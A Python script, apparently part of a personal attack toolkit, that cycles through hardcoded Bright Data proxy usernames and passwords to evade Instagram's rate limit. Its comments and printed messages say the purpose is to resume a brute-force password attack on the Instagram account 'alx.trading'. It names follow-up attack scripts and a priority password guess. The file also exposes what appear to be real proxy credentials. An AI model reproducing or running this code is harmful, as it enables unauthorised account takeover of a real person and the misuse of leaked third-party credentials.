#!/usr/bin/env python3
"""
💎 Premium IP Changer - Bright Data Proxy
ใช้ premium proxy จาก Bright Data เพื่อหลบ Instagram rate limit

Credentials:
- Host: brd.superproxy.io
- Ports: 9222 (Default), 9515 (Selenium)
- Username: brd-customer-hl_63f0835e-zone-scraping_agent
- Passwords: o5wnk3ws1r04, anyk0iuuh0ji

🎯 Target: Bypass Instagram rate limit for alx.trading attack
"""

import requests
import os
import time


class BrightDataIPChanger:
    """Premium IP changer using Bright Data proxies"""

    def __init__(self):
        # Bright Data credentials
        self.host = "brd.superproxy.io"
        self.username = "brd-customer-hl_63f0835e-zone-scraping_agent"
        self.passwords = ["o5wnk3ws1r04", "anyk0iuuh0ji"]
        self.ports = [9222, 9515]  # Default, Selenium

        self.original_ip = self.get_current_ip()
        print(f"📍 Original IP: {self.original_ip}")

    def get_current_ip(self):
        """Get current IP address"""
        try:
            response = requests.get('https://ifconfig.me', timeout=10)
            return response.text.strip()
        except:
            return "Unknown"

    def test_proxy_config(self, host, port, username, password):
        """Test specific proxy configuration"""
        proxy_url = f"http://{username}:{password}@{host}:{port}"

        try:
            print(
                f"🧪 Testing: {host}:{port} with password ending in ...{password[-4:]}")

            proxies = {'http': proxy_url, 'https': proxy_url}

            # Test IP change
            response = requests.get(
                'https://ifconfig.me',
                proxies=proxies,
                timeout=15
            )

            new_ip = response.text.strip()
            if new_ip != self.original_ip:
                print(f"✅ New IP obtained: {new_ip}")

                # Test Instagram access
                instagram_response = requests.get(
                    'https://www.instagram.com/accounts/login/',
                    proxies=proxies,
                    timeout=15,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
                    }
                )

                if instagram_response.status_code == 200:
                    print(f"🎉 Instagram accessible! No rate limit")
                    return proxy_url, new_ip
                elif instagram_response.status_code == 429:
                    print(f"🚨 Still rate limited on this IP")
                    return None, new_ip
                else:
                    print(
                        f"⚠️ Instagram returned HTTP {instagram_response.status_code}")
                    return None, new_ip
            else:
                print(f"❌ IP did not change")
                return None, None

        except Exception as e:
            print(f"❌ Proxy test failed: {e}")
            return None, None

    def find_working_proxy(self):
        """Find working Bright Data proxy configuration"""
        print("💎 Testing Bright Data premium proxy configurations...")
        print("="*60)

        for port in self.ports:
            for password in self.passwords:
                proxy_url, new_ip = self.test_proxy_config(
                    self.host, port, self.username, password
                )

                if proxy_url and new_ip:
                    print(f"\n🎉 SUCCESS! Working proxy found:")
                    print(f"   Host: {self.host}:{port}")
                    print(f"   Username: {self.username}")
                    print(f"   Password: {password}")
                    print(f"   New IP: {new_ip}")

                    return proxy_url, new_ip

                print(f"   Trying next configuration...\n")
                time.sleep(2)  # Brief delay between tests

        print("💔 No working Bright Data configuration found")
        return None, None

    def set_proxy_environment(self, proxy_url):
        """Set proxy environment variables"""
        os.environ['https_proxy'] = proxy_url
        os.environ['http_proxy'] = proxy_url
        os.environ['HTTP_PROXY'] = proxy_url
        os.environ['HTTPS_PROXY'] = proxy_url

        print(f"✅ Proxy environment variables set")
        print(f"🔧 All requests will now use: {proxy_url.split('@')[0]}@***")

    def test_instagram_final(self):
        """Final test of Instagram access"""
        print("\n🧪 Final Instagram access test...")

        try:
            response = requests.get(
                'https://www.instagram.com/accounts/login/',
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )

            if response.status_code == 200:
                print("🎉 SUCCESS! Instagram is accessible")
                print("✅ Ready to continue brute force attack")
                return True
            elif response.status_code == 429:
                print("🚨 Still rate limited")
                return False
            else:
                print(f"⚠️ HTTP {response.status_code}")
                return False

        except Exception as e:
            print(f"❌ Test failed: {e}")
            return False

    def change_ip_premium(self):
        """Main method to change IP using premium proxy"""
        print("💎 Bright Data Premium IP Changer")
        print("🎯 Target: Bypass Instagram rate limit for alx.trading")
        print("="*60)

        # Find working proxy
        proxy_url, new_ip = self.find_working_proxy()

        if not proxy_url:
            print("\n💔 Could not establish premium proxy connection")
            print("💡 Possible issues:")
            print("   - Credentials expired")
            print("   - Network connectivity")
            print("   - Bright Data service down")
            return False

        # Set environment variables
        self.set_proxy_environment(proxy_url)

        # Final test
        success = self.test_instagram_final()

        if success:
            print(f"\n🚀 Ready to continue Instagram attack!")
            print(f"📊 IP changed: {self.original_ip} → {new_ip}")
            print(f"💡 Run next command:")
            print(f"   python scripts/http400_fixed_brute.py")
            print(f"   # or")
            print(f"   python scripts/attack_alx_trading.py")

            # Show proxy info (masked)
            masked_proxy = proxy_url.split('@')[0] + "@***"
            print(f"\n🔧 Using premium proxy: {masked_proxy}")

        return success


def main():
    """Main function"""
    print("💎 Bright Data Premium IP Changer for Instagram")
    print("=" * 50)

    changer = BrightDataIPChanger()
    success = changer.change_ip_premium()

    if success:
        print("\n✅ PREMIUM IP CHANGE SUCCESSFUL!")
        print("🎯 Instagram rate limit bypassed")
        print("🚀 Ready to resume alx.trading attack")

        print("\n📋 Next steps:")
        print("1. Test HTTP 400 fix: python scripts/http400_fixed_brute.py")
        print("2. Resume attack: python scripts/attack_alx_trading.py")
        print("3. Priority password: 'AlexInstagram2025' (retry first)")

    else:
        print("\n❌ Premium IP change failed")
        print("💡 Fallback options:")
        print("1. python scripts/quick_ip_change.py  # Try Tor + free proxies")
        print("2. Restart Codespaces container")
        print("3. Use mobile hotspot")


if __name__ == "__main__":
    main()
